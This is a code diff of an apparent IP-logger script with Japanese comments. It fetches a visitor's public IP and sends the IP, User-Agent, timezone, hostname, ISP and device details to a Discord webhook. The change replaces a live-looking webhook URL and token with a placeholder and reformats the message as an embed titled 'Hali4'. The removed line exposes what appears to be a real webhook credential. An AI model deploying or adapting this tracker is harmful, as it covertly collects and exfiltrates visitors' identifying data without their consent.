@@ -20,7 +20,7 @@ fetch('https://api.ipify.org?format=json')
         const isp = data.org;
 
         // DiscordのWebhook URL
-        const webhookUrl = 'https://discord.com/api/webhooks/1096359611025596466/62Mx7UMX2KpAFFonceWoMoSrL4m0Ie0zuxQ6xRy1cbLZcTwGZxYC9iG7ZFXYzQQItD9A';
+        const webhookUrl = 'https://discord.com/api/webhooks/your-webhook-url-here';
 
         // アクセスした人のデバイス情報をまとめる
         const deviceInfo = {
@@ -39,8 +39,38 @@ fetch('https://api.ipify.org?format=json')
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            content: JSON.stringify(deviceInfo),
+            embeds: [{
+              title: 'Hali4',
+              color: 16711680,
+              fields: [
+                {
+                  name: 'User-Agent',
+                  value: deviceInfo['User-Agent'],
+                },
+                {
+                  name: 'IP',
+                  value: deviceInfo['IP'],
+                },
+                {
+                  name: 'Timezone',
+                  value: deviceInfo['Timezone'],
+                },
+                {
+                  name: 'Hostname',
+                  value: deviceInfo['Hostname'],
+                },
+                {
+                  name: 'ISP',
+                  value: deviceInfo['ISP'],
+                },
+                {
+                  name: 'Device',
+                  value: deviceInfo['Device'],
+                },
+              ],
+            }],
           }),
         });
       });
   });
+
